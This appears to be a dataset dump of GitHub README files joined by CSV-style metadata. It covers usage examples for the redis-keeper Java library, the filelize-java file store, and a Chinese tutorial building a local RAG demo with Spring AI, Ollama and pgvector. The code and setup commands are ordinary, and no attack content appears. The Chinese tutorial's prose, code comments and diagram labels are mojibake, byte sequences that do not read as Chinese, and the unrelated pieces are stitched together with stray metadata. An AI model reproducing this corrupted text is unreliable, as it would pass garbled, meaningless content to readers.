config.useSingleServer().setAddress(""redis://localhost:6379"").setPassword(yourPass);
```

```java
// 2. Create datasource
DefaultCacheDatasource datasource = new DefaultCacheDatasource();

Map<String, CacheTemplate> dsMap = datasource.initialize(new HashMap<String, CacheKeeperConfig>() {{
    put(""ds1"", new CacheKeeperConfig(config));
}});

Map<String, List<CacheTemplate>> dssMap = datasource.initializeMulti(new HashMap<String, List<CacheKeeperConfig>>() {{
    put(""ds2"", Collections.singletonList(new CacheKeeperConfig(config)));
}});
```

```java
// 3. Create datasource provider
CacheTemplateProvider<CacheTemplate> provider = new CacheTemplateProvider<>(dsMap, dssMap);
```

```java
// 4. Get redis template
Optional<CacheTemplate> templateOptional = provider.getTemplate(""ds1"");
final CacheTemplate cacheTemplate = templateOptional.get();
cacheTemplate.set(""foo"", ""bar"");

// or get the read and write state of the cacheTemplate
Optional<CacheTemplate> templateOptionalRW = provider.getTemplate(""ds1"", CacheDatasourceStatus.RW);

// or get multiple cacheTemplates
Collection<CacheTemplate> cacheTemplates = provider.getTemplates(""ds2"");

// or load balanced polling to get cacheTemplate from multiple data sources
Optional<CacheTemplate> polledTemplate = provider.pollTemplate(""ds2"");

// or randomize cacheTemplate from multiple data sources
Optional<CacheTemplate> randomedTemplate = provider.randomTemplate(""ds2"");
```

## Springboot

1. Maven

```java
<dependency>
	<groupId>org.codeba</groupId>
	<artifactId>redis-keeper-spring-boot-starter</artifactId>
	<version>2024.2.0</version>
</dependency>
```

2. Example datasource configuration as followsï¼š

```yaml
redis-keeper:
  redis:
    datasource:
      ds1:
        host: localhost
        port: 6379
        password: yourPass
        invoke-params-print: true

    datasources:
      ds2:
        - host: localhost
          port: 6379
          database: 1
          password: yourPass
          invoke-params-print: true

        - host: localhost
          port: 6379
          database: 2
          password: yourPass
          invoke-params-print: true

```

3. Examples of common methodsï¼š

```java
@SpringBootTest
public class AppTest {

    @Autowired
    private CacheTemplateProvider<CacheTemplate> provider;

    @Test
    public void test() {
        String key = ""foo"";
        String value = ""bar"";

        final CacheTemplate cacheTemplate = provider.getTemplate(""ds1"").get();
        // set
        cacheTemplate.set(key, value);
        cacheTemplate.setObject(key, value);
        // get
        cacheTemplate.get(key);
        cacheTemplate.getObject(key);
        cacheTemplate.getLong(key);
        cacheTemplate.getDouble(key);
        // incr
        cacheTemplate.incr(key);
        // set get bit
        cacheTemplate.setBit(key, 7, true);
        cacheTemplate.getBit(key, 7);
        // del exists expire ttl unlink
        cacheTemplate.del(key);
        cacheTemplate.exists(key);
        cacheTemplate.expire(key, 10, TimeUnit.SECONDS);
        cacheTemplate.expireAt(key, System.currentTimeMillis());
        cacheTemplate.ttl(key);
        cacheTemplate.unlink(key);
        // geo
        cacheTemplate.geoAdd(key, 13.361389, 38.115556, ""Sicily"");
        cacheTemplate.geoAdd(key, 15.087269, 37.502669, ""Palermo"");
        cacheTemplate.geoDist(key, ""Sicily"", ""Palermo"", ""km"");
        // hash
        cacheTemplate.hSet(key, ""field1"", value);
        cacheTemplate.hGet(key, ""field1"");
        // hyberloglog
        cacheTemplate.pfAdd(key, Arrays.asList(""a""));
        cacheTemplate.pfCount(key);
        // list
        cacheTemplate.rPush(key, ""world"", ""hello"");
        cacheTemplate.lRange(key, 0, -1);
        // set
        cacheTemplate.sAdd(key, ""hello"");
        cacheTemplate.sAdd(key, ""world"");
        cacheTemplate.sAdd(key, ""world"");
        cacheTemplate.sMembers(key);
        // zset
        cacheTemplate.zAdd(key, 1, ""one"");
        cacheTemplate.zAdd(key, 2, ""two"");
        cacheTemplate.zAdd(key, 3, ""three"");
        cacheTemplate.zRange(key, 0, -1);
        // bloom filter
        cacheTemplate.bfReserve(key, 1000, 0.01);
        cacheTemplate.bfAdd(key, ""item1"");
        cacheTemplate.bfAdd(key, ""item1"");
        cacheTemplate.bfExists(key, ""item2"");
        // lock
        cacheTemplate.tryLock(key, 3, TimeUnit.SECONDS);
        cacheTemplate.unlock(key);
        cacheTemplate.forceUnlock(key);
        // rate limiter
        cacheTemplate.trySetRateLimiter(key, 100, 1);
        cacheTemplate.tryAcquire(key);
        cacheTemplate.tryAcquire(key, 10);
        // pipeline execute
        cacheTemplate.pipeline(kBatch -> {
            kBatch.getString().setAsync(key, ""bar"");
            kBatch.getGeo().geoAddAsync(key, 13.361389, 38.115556, ""Sicily"");
            kBatch.getList().llenAsync(key);
        });
        // pipeline execute and get response
        final List<?> responses = cacheTemplate.pipelineWithResponses(kBatch -> {
            kBatch.getString().setAsync(key, ""bar"");
            kBatch.getGeo().geoAddAsync(key, 13.361389, 38.115556, ""Sicily"");
            kBatch.getList().llenAsync(key);
        });
        // pipeline execute async
        final CompletableFuture<Void> voidCompletableFuture = cacheTemplate.pipelineAsync(kBatch -> {
            kBatch.getString().setAsync(key, ""bar"");
            kBatch.getGeo().geoAddAsync(key, 13.361389, 38.115556, ""Sicily"");
            kBatch.getList().llenAsync(key);
        });
        // pipeline execute and get response async
        final CompletableFuture<List<?>> listCompletableFuture = cacheTemplate.pipelineWithResponsesAsync(kBatch -> {
            kBatch.getString().setAsync(key, ""bar"");
            kBatch.getGeo().geoAddAsync(key, 13.361389, 38.115556, ""Sicily"");
            kBatch.getList().llenAsync(key);
        });
    }

}

```

## Unlimited Expansion

#### CacheTemplate adds new custom methods

1. Maven

```java
<dependency>
	<groupId>org.codeba</groupId>
	<artifactId>redis-keeper-spring-boot-starter</artifactId>
	<version>2024.2.0</version>
</dependency>
```

2. CacheTemplate adds new custom methods

MyCacheTemplate.java

```java
import org.codeba.redis.keeper.support.CacheKeeperConfig;
import org.codeba.redis.keeper.support.DefaultRedissonTemplate;

public class MyCacheTemplate extends DefaultRedissonTemplate implements CacheTemplate {

    public MyCacheTemplate(CacheKeeperConfig cacheKeeperConfig) {
        super(cacheKeeperConfig);
    }

    public void test() {
	    final RedissonClient redissonClient = getDataSource();
        redissonClient.someMehotd();
        System.out.println(""hello world"");
    }

}
```

MyCacheDatasource.java

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.codeba.redis.keeper.support.CacheKeeperConfig;

public class MyCacheDatasource implements CacheDatasource<MyCacheTemplate> {

    @Override
    public MyCacheTemplate instantTemplate(CacheKeeperConfig config) {
        return new MyCacheTemplate(config);
    }

}
```

Enabling the new MyCacheDatasource

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MyConfiguration {

    @Bean
    public CacheDatasource<MyCacheTemplate> cacheDatasource() {
        return new MyCacheDatasource();
    }

}
```

3. Enabling the new CacheTemplate

```java
@SpringBootTest
public class AppTest {

    @Autowired
    private CacheTemplateProvider<MyCacheTemplate> myProvider;

    @Test
    public void testMyProvider() {
        final Optional<MyCacheTemplate> templateOptional = myProvider.getTemplate(""ds1"");

        if (templateOptional.isPresent()) {
            final MyCacheTemplate cacheTemplate = templateOptional.get();

            // Custom Methods
            cacheTemplate.test();

        }
    }

}
```

#### CacheDatasource custom redisson configuration

1. Maven

```java
<dependency>
	<groupId>org.codeba</groupId>
	<artifactId>redis-keeper-spring-boot-starter</artifactId>
	<version>2024.2.0</version>
</dependency>
```

2. For example, custom setting the encoding of redisson serialization and deserialization while enabling the new CacheDatasource.

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MyConfiguration {

    @Bean
    public CacheDatasource<CacheTemplate> cacheDatasource() {
        return new DefaultCacheDatasource(){
            @Override
            public Consumer<CacheKeeperConfig> configPostProcessor(Consumer<CacheKeeperConfig> consumer) {
                return v -> v.getConfig().setCodec(new JsonJacksonCodec());
            }
        };
    }

}
```

## More Samples

1. [Redis-Keeper only](https://github.com/codebaorg/redis-keeper/tree/main/redis-keeper-example/redis-keeper-example-standalone)
2. [Redis-Keeper with Spring boot](https://github.com/codebaorg/redis-keeper/tree/main/redis-keeper-example/redis-keeper-example-springboot)
3. [Redis-Keeper with Spring cloud](https://github.com/codebaorg/redis-keeper/tree/main/redis-keeper-example/redis-keeper-example-springcloud)


## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=codebaorg/redis-keeper&type=Date)](https://star-history.com/#codebaorg/redis-keeper&Date)

",2,0,2,0.0,"['redis', 'keeper', 'lightweight', 'redis', 'management', 'tool', 'feature', 'quick', 'start', 'maven', 'gradle', 'sbt', 'java', 'springboot', 'unlimited', 'expansion', 'cachetemplate', 'add', 'new', 'custom', 'method', 'cachedatasource', 'custom', 'redisson', 'configuration', 'more', 'sample', 'star', 'history']","['redis', 'custom', 'keeper', 'lightweight', 'management']",10.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,8.0,2.0
filelize/filelize-java,main,"# Filelize for java/kotlin
![Filelize build status](https://github.com/filelize/filelize-java/actions/workflows/maven.yml/badge.svg) ![Filelize release status](https://github.com/filelize/filelize-java/actions/workflows/maven-publish.yml/badge.svg)

<img align=""right"" src=""/filelize.jpg"" alt=""Filelize"" width=""160"" height=""160""> 

Filelize is a lightweight database that simplifies writing and reading data into human-readable files, requiring just one line of code.

One of the biggest advantages is in the annotations and methods provided, eliminating the need for repetitive boilerplate code. Additionally, it offers flexibility with options for both single and multiple file storage, giving an easy way to work with very large collections distributed among multiple files. 
Filelize is most commonly used to save files as json for [Test Data Setup](https://github.com/filelize/filelize-java?tab=readme-ov-file#filelize-for-test-data-setup) or when a full-fledged database isn't necessary.

### Usage

To integrate [Filelizer](https://mvnrepository.com/artifact/io.github.filelize/filelize-java) into your project, add the following dependency to your pom.xml 
```xml
<dependency>
  <groupId>io.github.filelize</groupId>
  <artifactId>filelize-java</artifactId>
  <version>0.9.5</version>
</dependency>
```
For Gradle, you can use:
```groovy
implementation 'io.github.filelize:filelize-java:0.9.5'
```

Ref: [Publish your artifact to the Maven Central Repository using GitHub Actions](https://medium.com/@jtbsorensen/publish-your-artifact-to-the-maven-central-repository-using-github-actions-15d3b5d9ce88)

## Getting started

Initialize a `Filelizer` with your preferred location of your files. (For subdirectories you can add them directly on your domain object)

```java
Filelizer filelizer = new Filelizer(""src/test/resources/"");
```
#### Save an object
```java
var id = filelizer.save(something);
```
#### SaveAll objects in one or multiple file(s):
```java
var ids = filelizer.saveAll(somethings);
```
#### Find a object
```java
var something = filelizer.find(""id1"", Something.class);
```
#### FindAll objects:
```java
var somethings = filelizer.findAll(Something.class);
```

### Saving to a single file
To save an object to a single file, annotate your model class with `@Filelize` and set the `type` parameter to `FilelizeType.SINGLE_FILE`. Additionally, mark the identifying attribute with `@Id`.

```java
import io.github.filelize.Filelize;
import io.github.filelize.Id;

@Filelize(name = ""something_single"", type = FilelizeType.SINGLE_FILE, directory = ""something_single"")
public class Something {
    @Id
    private String id;
    private String name;
    ...
}
```

### Saving to multiple files
For saving objects to multiple files, follow the same steps as for single-file saving, but set the type parameter to `FilelizeType.MULTIPLE_FILES`.

```java
import io.github.filelize.Filelize;
import io.github.filelize.Id;

@Filelize(name = ""my_something"", type = FilelizeType.MULTIPLE_FILES, directory = ""something_multiple/mydirectory"")
public class Something {
    @Id
    private String id;
    private String name;
    ...
}
```

## Filelize in Spring Boot
Spring Boot applications typically leverage annotations and configuration classes for managing beans and functionalities.
Here's how you can use Filelizer in a Spring Boot application:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.stereotype.Service;
import io.github.filelize.FilelizeType;
import io.github.filelize.Filelizer;

@Service
public class FilelizerService {

    private final ObjectMapper objectMapper;
    private final Filelizer filelizer;

    public FilelizerService(ObjectMapper objectMapper) {
        this.objectMapper = objectMapper;
        this.filelizer = new Filelizer(""src/main/resources/"", objectMapper, FilelizeType.OBJECT_FILE);
    }
    
    public void updateName(String id, String name){
        var something = filelizer.find(id, Something.class);
        something.setName(name);
        filelizer.save(something);
    }
}
```

## Filelize for Test Data Setup

So you are working on setting up test data scenario for your unit test. This manual process is typically involving alot of boilerplate code. This is especially true when working on complex classes that contain many fields and collections.
What we usually need is the presence of an object, where only a few values are important to be able to make a meaningful test.
Here are some steps you could take to setup your test data:

1. Create a Filelizer service that saves your objects or collections to a test data folder
```java
Filelizer filelizer = new Filelizer(""src/test/resources/testdata"");
```
2. Run the application with the scenarios that you wanna test. Make sure to save the result for each scenario, e.g. `filelizer.save(""somethingTest1"", something);`
3. Now you should have some test data files in your testdata folder like: `.../testdata/somethingTest1.json` and `.../testdata/somethingTest2.json`
4. Create a test and load your test data
```java
@Test
public void testSomething() {
    var something = filelizer.find(""somethingTest2"", Something.class);
    assertEquals(""somethingTest2"", something.getId());
}
```

## Contribute
Contributions are welcomed! Feel free to create a pull request to contribute.
",6,2,1,2.0,"['filelize', 'usage', 'get', 'start', 'save', 'object', 'saveall', 'object', 'one', 'multiple', 'file', 's', 'find', 'object', 'findall', 'object', 'save', 'single', 'file', 'save', 'multiple', 'file', 'filelize', 'spring', 'boot', 'filelize', 'test', 'data', 'setup', 'contribute']","['object', 'filelize', 'save', 'file', 'multiple']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
jianyuan1991/ragdemo,main,"
# Spring AI+Ollama+pgvectorå®ç°æœ¬åœ°RAG

## å‰è¨€

ä¹‹å‰å†™è¿‡ä¸€ç¯‡[Spring AI+Ollamaæœ¬åœ°ç¯å¢ƒæ­å»º](https://www.bxmdm.com/archives/2024030801)çš„æ–‡ç« ï¼Œæœ¬ç¯‡åœ¨æ­¤åŸºç¡€ä¸Šè¿›ä¸€æ­¥æ­å»ºæœ¬åœ°RAGã€‚RAGæ˜¯ç›®å‰å¤§æ¨¡å‹åº”ç”¨è½åœ°çš„ä¸€å¥—è§£å†³æ–¹æ¡ˆï¼Œä¸­æ–‡åå«æ£€ç´¢å¢å¼ºï¼Œç”±äºå¤§è¯­è¨€æ¨¡å‹æœ‰æ—¶æ•ˆæ€§å’Œå¹»è§‰ç­‰å±€é™æ€§ï¼Œä½¿ç”¨RAGæ–¹æ¡ˆï¼Œå…ˆåˆ©ç”¨æœç´¢æŠ€æœ¯ä»æœ¬åœ°çŸ¥è¯†ä¸­æœç´¢å‡ºæƒ³è¦çš„ç›¸å…³ä¿¡æ¯ï¼Œåœ¨å°†ç›¸å…³ä¿¡æ¯ç»„æˆpromptä¸­ä¸Šä¸‹æ–‡çš„ä¸€éƒ¨åˆ†ï¼Œåœ¨ç”±å¤§æ¨¡å‹æ ¹æ®promptè¿›è¡Œå›å¤ã€‚æœ¬æ¬¡å°±æ„å»ºä¸€ä¸ªdemoï¼Œä½¿ç”¨RAGæŠ€æœ¯æ„å»ºä¸€ä¸ªæ–‡æ¡£é—®ç­”çš„åº”ç”¨ã€‚å¦‚å›¾æ‰€ç¤ºï¼ŒRAGæ–‡æ¡£é—®ç­”çš„æ•´ä½“æµç¨‹å¤§è‡´åˆ†æˆä¸¤ä¸ªé˜¶æ®µï¼š

1ã€æ•°æ®å‡†å¤‡ï¼Œå°†å¾…æ–‡æœ¬æ•°æ®é€šè¿‡embeddingæ¨¡å‹è½¬æˆæ–‡æœ¬å‘é‡ï¼Œå¹¶å­˜å‚¨åˆ°å‘é‡æ•°æ®åº“ä¸­ã€‚

2ã€ç”¨æˆ·æé—®ï¼Œå°†ç”¨æˆ·æå‡ºçš„æ–‡æœ¬é€šè¿‡embeddingæ¨¡å‹è½¬æˆé—®é¢˜æ–‡æœ¬å‘é‡ï¼Œå¹¶åœ¨å‘é‡åº“ä¸­è¿›è¡Œæœç´¢ï¼Œæœç´¢å¾—åˆ°ä¸€äº›æ–‡æœ¬æ®µè½ï¼Œå°†æœç´¢åˆ°çš„æ–‡æœ¬æ®µè½ç»„è£…æˆpromptå»è°ƒç”¨å¤§æ¨¡å‹æ¥è·å¾—ç­”æ¡ˆã€‚

```mermaid
graph LR  
    
    user[User] --> question[é—®é¢˜]
    doc[æ–‡æœ¬æ•°æ®] --> embedding[Embedding Model]  
    embedding --> docVector[æ–‡æœ¬å‘é‡]
    docVector --> VectorDatabase[å‘é‡æ•°æ®åº“]
    question[é—®é¢˜] --> embedding[Embedding Model] 
    embedding[Embedding Model]  --> questionVector[é—®é¢˜å‘é‡]
    questionVector[é—®é¢˜å‘é‡] --> VectorDatabase[å‘é‡æ•°æ®åº“]
    VectorDatabase[å‘é‡æ•°æ®åº“] --> docParagraph[æ–‡æœ¬æ®µè½]
    docParagraph[æ–‡æœ¬æ®µè½] --> prompt[æç¤ºè¯]
    prompt[æç¤ºè¯] --> llm[å¤§æ¨¡å‹]
    llm[å¤§æ¨¡å‹] --> answer[ç­”æ¡ˆ]
    answer[ç­”æ¡ˆ] --> user[User]
    
    style doc fill:#98FB98;
    style docVector fill:#98FB98;
    style user fill:#FF8C00;
    style question fill:#FF8C00;
    style questionVector fill:#FF8C00;
    style docParagraph fill:#FF8C00;
    style prompt fill:#FF8C00;
    style answer fill:#FF8C00;
```

æœ¬æ¬¡demoä¸­ï¼Œæ•´ä½“æµç¨‹çš„ä¸šåŠ¡é€»è¾‘éƒ½é€šè¿‡spring aiæ¥å®ç°ï¼Œspring aiæ”¯æŒè°ƒç”¨Ollamaæ¥å®ç°chatå’Œembeddingï¼Œæ”¯æŒpgvectoræ¥ä½œä¸ºå‘é‡æ•°æ®å­˜å‚¨å’Œæœç´¢ï¼Œæ‰€ä»¥é€‰æ‹©çš„æ¨¡å‹å’Œæ•°æ®åº“ä¿¡æ¯å¦‚ä¸‹ï¼š

æ¨¡å‹è¿è¡Œå·¥å…·ï¼šOllama

embeddingæ¨¡å‹ï¼š mofanke/dmeta-embedding-zhï¼ˆä¸­æ–‡æ”¯æŒæ¯”è¾ƒå¥½ï¼‰

å¤§æ¨¡å‹ï¼šqwen:7bï¼ˆä¸­æ–‡æ”¯æŒæ¯”è¾ƒå¥½ï¼‰

å‘é‡æ•°æ®åº“ï¼špgvectorï¼ˆpostgresqlï¼‰



**å·¥ç¨‹å®Œæ•´ä»£ç :**

https://github.com/jianyuan1991/ragdemo

https://gitee.com/jianyuan/ragdemo

## ç¯å¢ƒå‡†å¤‡

### Ollamaå’Œæ¨¡å‹

Ollamaæœ¬åœ°éƒ¨ç½²

ä¸‹è½½qwen:7b:

```powershell
ollama run qwen:7b
```

*Ollamaéƒ¨ç½²å’Œqwenæ¨¡å‹ä¸‹è½½å¯ä»¥å‚è€ƒ[Spring AI+Ollamaæœ¬åœ°ç¯å¢ƒæ­å»º](https://www.bxmdm.com/archives/2024030801)*



ä¸‹è½½embeddingæ¨¡å‹:

```powershell
ollama pull  mofanke/dmeta-embedding-zh
```

![å®‰è£…dmeta-embedding-zhå®Œæˆ](./img/å®‰è£…dmeta-embedding-zhå®Œæˆ.png)



### pgvector

pgvectoræ˜¯postgresqlçš„ä¸€ä¸ªæ‰©å±•ï¼Œä½¿å¾—postgresqlèƒ½å¤Ÿå­˜å‚¨å’Œæœç´¢å‘é‡æ•°æ®ï¼Œpgvector æä¾› 2 ç§ç±»å‹çš„ç´¢å¼•ï¼ŒIVFFlat å’Œ HNSWï¼Œéƒ½æ˜¯è¿‘ä¼¼æœ€è¿‘é‚» ï¼ˆANNï¼‰ ç´¢å¼•ï¼Œç´¢å¼•å¯ä»¥åŠ å¿«æœç´¢ç›¸ä¼¼å‘é‡çš„é€Ÿåº¦ã€‚ä»¥ä¸‹æ˜¯å®ƒä»¬çš„ä¸»è¦åŒºåˆ«ï¼š

![IVFFlatå’ŒHNSWçš„åŒºåˆ«](./img/IVFFlatå’ŒHNSWåŒºåˆ«.png)

å¦å¤–pgvector å¼•å…¥äº†ä¸‰ä¸ªå¯ç”¨äºè®¡ç®—ç›¸ä¼¼åº¦çš„æ–°è¿ç®—ç¬¦ï¼š <-> â€“ æ¬§å‡ é‡Œå¾—è·ç¦»ã€<#> â€“ è´Ÿå†…ç§¯ã€<=> â€“ ä½™å¼¦è·ç¦»

æœ¬æ¬¡demoé‡‡ç”¨dockerå®‰è£…pgvector:

```
docker run --name pgvector \
    -e POSTGRES_PASSWORD=postgres \
    -p 5432:5432 \
	-d pgvector/pgvector:pg16
```



## ä¸šåŠ¡å®ç°

### æ•°æ®å‡†å¤‡

æœ¬æ¬¡demoæ–‡æœ¬æ•°æ®è¯»å–txtæ–‡ä»¶ï¼Œspring aiä¸­å®ç°äº†TextReaderç”¨äºè¯»å–txtæ–‡ä»¶ï¼Œéƒ¨åˆ†æºç å¦‚ä¸‹ï¼Œæ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰å¯¹æ–‡æœ¬å†…å®¹è¿›è¡Œè§£æï¼ˆæ–‡æœ¬å†…å®¹çš„è§£æåœ¨RAGä¸­å¾ˆé‡è¦ï¼Œç›´æ¥å½±åƒRAGä¸­æ–‡æœ¬ä¿¡æ¯çš„æœç´¢æ•ˆæœï¼‰ã€‚

```java
String document = StreamUtils.copyToString(this.resource.getInputStream(), this.charset);

// Inject source information as a metadata.
this.customMetadata.put(CHARSET_METADATA, this.charset.name());
this.customMetadata.put(SOURCE_METADATA, this.resource.getFilename());

return List.of(new Document(document, this.customMetadata));
```

æœ¬æ¬¡demoé‡æ–°å®ç°TXTçš„è¯»å–ï¼Œæ ¹æ®å›è½¦ç¬¦å¯¹æ–‡æœ¬å†…å®¹è¿›è¡Œåˆ†æ®µï¼Œå¹¶é‡‡ç”¨çª—å£æ¨¡å¼å¯¹åˆ†æ®µå†…å®¹è¿›è¡Œæ–‡æ¡£åˆ’åˆ†ï¼Œå¯ä»¥å…ˆå¤åˆ¶TextReaderä»£ç ï¼Œæ–°å»ºâ€œParagraphTextReaderâ€å®ç°ç±»ï¼Œéƒ¨åˆ†å®ç°ä»£ç å¦‚ä¸‹ï¼š

```java
/**
* é»˜è®¤çª—å£å¤§å°ï¼Œä¸º1
*/
private static final int DEFAULT_WINDOW_SIZE = 1;

/**
* çª—å£å¤§å°ï¼Œä¸ºæ®µè½çš„æ•°é‡ï¼Œç”¨äºæ»šåŠ¨è¯»å–
*/
private int windowSize = DEFAULT_WINDOW_SIZE;

public static final String START_PARAGRAPH_NUMBER = ""startParagraphNumber"";
public static final String END_PARAGRAPH_NUMBER = ""endParagraphNumber"";

/**
* è¯»å–æ–‡æœ¬å†…å®¹,å¹¶æ ¹æ®æ¢è¡Œè¿›è¡Œåˆ†æ®µ,é‡‡ç”¨çª—å£æ¨¡å¼,çª—å£ä¸ºæ®µè½çš„æ•°é‡
*
* @return æ–‡æ¡£ä¿¡æ¯åˆ—è¡¨
*/
@Override
public List<Document> get() {
    try {

        List<Document> readDocuments = new ArrayList();
        String document = StreamUtils.copyToString(this.resource.getInputStream(), this.charset);

        // Inject source information as a metadata.
        this.customMetadata.put(CHARSET_METADATA, this.charset.name());
        this.customMetadata.put(SOURCE_METADATA, this.resource.getFilename());
		
        //æ–‡æœ¬å†…å®¹æ ¹æ®å›è½¦ç¬¦è¿›è¡Œåˆ†æ®µ
        List<String> paragraphs = Arrays.asList(document.split(""\n""));

        //é‡‡ç”¨çª—å£æ»‘åŠ¨è¯»å–åˆ†æ®µå†…å®¹
        int startIndex = 0;
        int endIndex = startIndex + this.windowSize;
        if (endIndex > paragraphs.size()) {
            readDocuments.add(this.toDocument(paragraphs, startIndex + 1, paragraphs.size()));
        } else {
            for (; endIndex <= paragraphs.size(); startIndex++, endIndex++) {
                readDocuments.add(this.toDocument(ListUtil.sub(paragraphs, startIndex, endIndex), startIndex + 1, endIndex));
            }
        }
        return readDocuments;
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
}

/**
 * å°è£…æ®µè½æˆæ–‡æ¡£
 * @param paragraphList æ®µè½å†…å®¹åˆ—è¡¨
 * @param startParagraphNum å¼€å§‹æ®µè½ç¼–ç 
 * @param endParagraphNum ç»“æŸæ®µè½ç¼–ç 
 * @return æ–‡æ¡£ä¿¡æ¯
 */
private Document toDocument(List<String> paragraphList, int startParagraphNum, int endParagraphNum) {
    Document doc = new Document(String.join(""\n"", paragraphList));
    doc.getMetadata().putAll(this.customMetadata);
    doc.getMetadata().put(START_PARAGRAPH_NUMBER, startParagraphNum);
    doc.getMetadata().put(END_PARAGRAPH_NUMBER, endParagraphNum);
    return doc;
}
```



æ„å»ºæ–‡ä»¶ä¸Šä¼ æ¥å£ç”¨æ¥æ¥æ”¶TXTæ–‡ä»¶ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹:

```java
@PostMapping(""/upload"")
public ResponseEntity upload(@RequestBody MultipartFile file) {
    documentService.uploadDocument(file);
    return ResponseEntity.ok(""success"");
}
```



documentServiceæœåŠ¡ä¸­å®ç°æ–‡ä»¶çš„ä¸Šä¼ è§£æ,å¹¶ä½¿ç”¨spring aiä¸­çš„VectorStoreå­˜å‚¨æ•°æ®ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹:

```java
@Autowired
private VectorStore vectorStore;

private static final String PATH = ""D:\\demo\\ai\\path\\"";

/**
 * ä½¿ç”¨spring aiè§£ætxtæ–‡æ¡£
 *
 * @param file
 * @throws MalformedURLException
 */
public void uploadDocument(MultipartFile file) {
    //ä¿å­˜fileåˆ°æœ¬åœ°
    String textResource = file.getOriginalFilename();
    //åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯TXT
    if (!textResource.endsWith("".txt"")) {
        throw new RuntimeException(""åªæ”¯æŒtxtæ ¼å¼æ–‡ä»¶"");
    }
    String filepath = PATH + textResource;
    File file1 = new File(filepath);
    if(file1.exists()){
        throw new RuntimeException(""æ–‡ä»¶å·²å­˜åœ¨"");
    }
    try {
        file.transferTo(file1);
    } catch (Exception e) {
        e.printStackTrace();
    }
    List<Document> documentList = paragraphTextReader(file1);
    vectorStore.add(documentList);
}

private List<Document> paragraphTextReader(File file) {
    List<Document> docs = null;
    try {
        //è¿™é‡Œæˆ‘ä»¬è®¾ç½®æ»‘åŠ¨çª—å£å¤§å°ä¸º5
        ParagraphTextReader reader = new ParagraphTextReader(new FileUrlResource(file.toURI().toURL()), 5);
        reader.getCustomMetadata().put(""filename"", file.getName());
        reader.getCustomMetadata().put(""filepath"", file.getAbsolutePath());
        docs = reader.get();
    } catch (Exception e) {
        e.printStackTrace();
    }
    return docs;
}
```



### ç”¨æˆ·æé—®

ç”¨æˆ·æé—®éœ€è¦å…ˆæ ¹æ®é—®é¢˜ä»å‘é‡åº“ä¸­æœç´¢å“åº”çš„æ®µè½ï¼Œç”±äºdemoä¸­æ–‡æœ¬è§£æä½¿ç”¨æ»‘åŠ¨çª—å£çš„æ¨¡å‹è¿›è¡Œè¯»å–ï¼Œè¿™é‡Œéœ€è¦å¯¹æœç´¢ç»“æœè¿›è¡Œä¸€æ¬¡åˆå¹¶ï¼Œä»£ç éƒ¨åˆ†å¦‚ä¸‹ï¼š

```java
/**
 * åˆå¹¶æ–‡æ¡£åˆ—è¡¨
 * @param documentList æ–‡æ¡£åˆ—è¡¨
 * @return åˆå¹¶åçš„æ–‡æ¡£åˆ—è¡¨
 */
private List<Document> mergeDocuments(List<Document> documentList) {
	List<Document> mergeDocuments = new ArrayList();
	//æ ¹æ®æ–‡æ¡£æ¥æºè¿›è¡Œåˆ†ç»„
	Map<String, List<Document>> documentMap = documentList.stream().collect(Collectors.groupingBy(item -> ((String) item.getMetadata().get(""source""))));
	for (Entry<String, List<Document>> docListEntry : documentMap.entrySet()) {
		//è·å–æœ€å¤§çš„æ®µè½ç»“æŸç¼–ç 
		int maxParagraphNum = (int) docListEntry.getValue()
				.stream().max(Comparator.comparing(item -> ((int) item.getMetadata().get(END_PARAGRAPH_NUMBER)))).get().getMetadata().get(END_PARAGRAPH_NUMBER);
		//æ ¹æ®æœ€å¤§æ®µè½ç»“æŸç¼–ç æ„å»ºä¸€ä¸ªç”¨äºåˆå¹¶æ®µè½çš„ç©ºæ•°ç»„
		String[] paragraphs = new String[maxParagraphNum];
		//ç”¨äºè·å–æœ€å°æ®µè½å¼€å§‹ç¼–ç 
		int minParagraphNum = maxParagraphNum;
		for (Document document : docListEntry.getValue()) {
			//æ–‡æ¡£å†…å®¹æ ¹æ®å›è½¦è¿›è¡Œåˆ†æ®µ
			String[] tempPs = document.getContent().split(""\n"");
			//è·å–æ–‡æ¡£å¼€å§‹æ®µè½ç¼–ç 
			int startParagraphNumber = (int) document.getMetadata().get(START_PARAGRAPH_NUMBER);
			if (minParagraphNum > startParagraphNumber) {
				minParagraphNum = startParagraphNumber;
			}
			//å°†æ–‡æ¡£æ®µè½åˆ—è¡¨æ‹·è´åˆ°åˆå¹¶æ®µè½æ•°ç»„ä¸­
			System.arraycopy(tempPs, 0, paragraphs, startParagraphNumber-1, tempPs.length);
		}
		//åˆå¹¶æ®µè½å»é™¤ç©ºå€¼,å¹¶ç»„æˆæ–‡æ¡£å†…å®¹
		Document mergeDoc = new Document(ArrayUtil.join(ArrayUtil.removeNull(paragraphs), ""\n""));
		//åˆå¹¶å…ƒæ•°æ®
		mergeDoc.getMetadata().putAll(docListEntry.getValue().get(0).getMetadata());
		//è®¾ç½®å…ƒæ•°æ®:å¼€å§‹æ®µè½ç¼–ç 
		mergeDoc.getMetadata().put(START_PARAGRAPH_NUMBER, minParagraphNum);
		//è®¾ç½®å…ƒæ•°æ®:ç»“æŸæ®µè½ç¼–ç 
		mergeDoc.getMetadata().put(END_PARAGRAPH_NUMBER, maxParagraphNum);
		mergeDocuments.add(mergeDoc);
	}
